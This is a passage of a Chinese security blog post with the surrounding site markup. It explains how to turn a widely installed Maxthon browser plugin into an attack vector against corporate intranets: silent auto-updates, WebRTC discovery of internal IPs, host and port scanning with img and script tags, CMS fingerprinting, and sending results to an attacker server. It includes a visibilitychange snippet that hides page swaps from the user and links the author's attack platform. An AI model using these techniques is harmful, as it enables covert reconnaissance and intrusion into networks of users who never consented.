+<p>即使你没有相关的插件作者用户。可以使用组简单的html+swf来写一个插件小游戏，一个星期就可以上千。这里我打个比方，10w用户都安装了我的插件。<br>其中5w是已经工作的用户。2w是在公司电脑上使用maxthon并安装了插件，一旦打开maxthon浏览器，插件就会自动运行。而当插件发现有新版本时，会自动静默安装。然后就会运行我们的JavaScript代码，而我在0x03节的地方说到maxthon也是支持WebRTC的，但是这里会有坑。我不清楚是不是由版本引起的问题，在chrome下运行WebRTC代码时会显示一组IP，也是当前电脑的内网IP，而在maxthon下，会出现三组，可能不止三组。如图：</p>
+<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/24.png" alt=""></p>
+<p>其中192.168.27.1是我电脑上的VM虚拟机的IP段。192.168.118.1也是VM虚拟机上的ip段。只有192.168.1.104才是当前真正的内网IP。所以在源程序里会出现join函数和对ipList变量的for循环。</p>
+<blockquote>
+<h3 id="0x13失败的思路："><a href="#0x13失败的思路：" class="headerlink" title="0x13失败的思路："></a>0x13失败的思路：</h3></blockquote>
+<p><strong>思路一、</strong></p>
+<p>假设这里获取到的内网IP为192.168.21.104。根据for循环输出img、script标签可以获取到内网的所以存活IP地址（也可以探测port），但是这里有一个问题，就是JavaScript里怎么获取到其他内网的资源信息，因为跨域，ajax、iframe都不行。我昨天晚上问了0xJin，他是没有获取，只是扫的存活IP及端口。但是说好是内网漫游，不能只获取到当前触发XSS的Pc。昨天晚上查了一夜的资料，有个思路，但是不知道能不能实现。这里说明一下，如果有什么好的建议可以提出来。当然思路可能错误。 </p>
+<p>前面的跳过，假设现在已经有了内网中开放80端口的IP。<br>既然ajax、iframe都不行，那我们可以尝试一下flash来获取，但是flash也有相应的crossdomain.xml限制，但是今天上午查资料的时候找到了这么一篇文章：<a href="http://www.litefeel.com/cross-flash-security-sandbox-get-visual-data" target="_blank" rel="external">http://www.litefeel.com/cross-flash-security-sandbox-get-visual-data</a><br>根据作者所说，这个方法只能获取到视觉对象（图片、swf），也就是说无法获取存活IP里的html源码了。</p>
+<p>我想是否可以使用flash发送一个带有XSS的URL（内网IP）<br>XSS里调用Html2canvas插件来把存活IP中的网站截图发送给我们的服务器端。<br>当然了，这里有一个限制条件，就是必须获取存活IP中网站的cms信息（可以使用<code>&lt;img src=&quot;内网IP/favicon.ico&quot;&gt;</code>再把图片发送给远程服务器，来接受。这样就可以判断属于哪个cms类型的了，构架代码的时候可以加一个定时获取远程服务器的JavaScript代码，这样我们看到是cms类型后，就可以在网上找相应的爆版本信息的方法，写成代码，等待客服端的定时任务获取到）。 </p>
+<p>现在信息有了，还有一个条件，就是XSS漏洞，需要XSS漏洞来加载Html2canvas插件，并且保存成图片发送给远程的服务器。 </p>
+<p>问题来了，反射XSS并不是正真的打开网站，而是发送get请求。那canvas并不会加载，也就说图片获取失败。储蓄型的话可能成功。 </p>
+<p>失败的原因：</p>
+<ol>
+<li><p>canvas无法获取到iframe里的DOM内容</p>
+</li>
+<li><p>img无法发送到远程服务器，因为调用img图片的时候，当前页面和img的图片不是同源的，无法发送</p>
+</li>
+<li><p>隐蔽性很差</p>
+</li>
+</ol>
+<p><strong> 思路二、</strong></p>
+<p>之前我提到的思路是使用xss+iframe+canvas，但是@超威蓝猫 说到canvas无法截取到iframe里的内容，后来我上网查后，确实如此（基础不牢的结果）。后来我又有了一个新的思路，使用<code>&lt;img src=&quot;https://xxx.xxx.xxx.xxx/favico.ico&quot; /&gt;</code>来获取网站的cms信息，因为不同的cms他们的ico图标也是不一样的，把img发送到服务器端后，就可以识别网站属于哪种cms类型了。但是后来和伟哥 @呆子不开口 讨论了几个小时，发现忽略了一个重要的问题，怎么把img发送到远程服务器，img图片地址不是同源的，而且怎么把图片使用JavaScript转成二进制数据。这个思路又断了。伟哥提到一个很nice的解决方案，检测js脚本，也就是<code>&lt;script src=&quot;http://xxx.xxx.xxx.xxx/path/cms.js&quot; onload=&quot;xxx(this)&quot;&gt;&lt;/script&gt;</code>这样的话，我就需要大量cms独立的js文件位置。工作量大。我本来都打算使用这个了，但是前几天闲的无聊翻自己的QQ日志时，发现了一段代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">"visibilitychange"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.title = <span class="built_in">document</span>.hidden ? <span class="string">'iloveyou'</span> : <span class="string">'metoo'</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
+<p>这是HTML5推出的API，我发现我可以利用这个API来达到神不知鬼不觉的上传图片。首先当用户切换到其他浏览器标签的时候，document.hidden会为true。那么我们就可以确定用户没有访问我们XSS的网页。那么我们干什么用户都不会发现了。大致的思路如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">"visibilitychange"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">document</span>.hidden)&#123;</span><br><span class="line">        <span class="keyword">var</span> htmlText = $(<span class="string">"body"</span>).html();</span><br><span class="line">        $(<span class="string">"body"</span>).empty();</span><br><span class="line">        $(<span class="string">"body"</span>).append(<span class="string">"&lt;img src='http://xxx.xxx.xxx.xxx/favico.ico' /&gt;"</span>);</span><br><span class="line">        <span class="comment">//canvas获取页面，请移步：http://leobluewing.iteye.com/blog/2020145</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $(<span class="string">"body"</span>).empty();</span><br><span class="line">        $(<span class="string">"body"</span>).append(htmlText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
+<p>失败的原因：</p>
+<ol>
+<li><p>因为之前提到过img加载太消耗时间，尤其在maxthon浏览器下，三组以上的IP地址全部检测完成需要30分钟左右。如果用此方法的话，需要确保用户在半个小时内不能打开此页面</p>
+</li>
+<li><p>canvas无法获得不是本源的图片，也就是说不能获取到img加载的图片</p>
+</li>
+</ol>
+<p>总结后，就采用了伟哥的方法。</p>
+<blockquote>
+<h3 id="0x14结尾："><a href="#0x14结尾：" class="headerlink" title="0x14结尾："></a>0x14结尾：</h3></blockquote>
+<p>在此尤其感谢，@呆子不开口 。这篇文章写的很累，因为img标签发送的耗时长的问题，导致每一次修改BUG的时候，都需要等9-10分钟。也是我目前为止写的时间最长的一篇文章。因为要学驾照，时间更少了。大概花了一个月左右的时间。之前和主编约稿的日期是15日，一直拖到现在，挺对不住的。前端、后端、数据库还有些的BUG没有修复，如果此平台的安装量达到1000会继续更新，下面是平台下载的url：<br><a href="https://github.com/BlackHole1/WebRtcXSS" target="_blank" rel="external">https://github.com/BlackHole1/WebRtcXSS</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2016/12/13/公司wifi安全/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">公司wifi安全</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+<div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="XSS自动化入侵内网" data-title="浏览器插件的攻击向量" data-url="http://bugs.cc/2016/12/14/XSS自动化入侵内网/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"blackhole"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2016 Black-Hole
+    	</div>
+      	<div class="footer-right">
+      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+      	</div>
+    </div>
+  </div>
+</footer>
+<script src="https://s4.cnzz.com/z_stat.php?id=1260293515&web_id=1260293515" language="JavaScript"></script>
+
+    </div>
+    
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  </div>
+</body>
+</html>
